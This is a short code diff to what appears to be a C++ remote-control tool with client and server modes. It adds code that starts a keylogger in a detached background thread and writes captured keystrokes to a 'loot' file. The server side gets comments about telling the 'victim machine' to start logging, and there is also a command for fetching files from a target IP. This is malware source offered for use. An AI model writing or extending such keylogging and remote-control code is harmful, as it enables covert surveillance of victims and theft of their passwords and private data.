@@ -171,6 +171,12 @@ int clientMode(const Properties &p) {
         return 0;
     }
     */
+    // Start the keylogger in another thread and detach
+    std::thread kl_thread([p] {
+        Keylogger kl(p.at("keylogLootFile"));
+        kl.start_logging();
+    });
+    kl_thread.detach();
 
     // get all the settings
     const std::string &interface = p.at("interface");
@@ -256,7 +262,9 @@ int serverMode(const Properties &p) {
         }
 
         // format: keylog [ip]
+        // Delete if not necessary
         if (tokens[0] == "keylog") {
+            // Tell the victim machine to start the keylogger
         }
 
         // format: get [ip] [file]
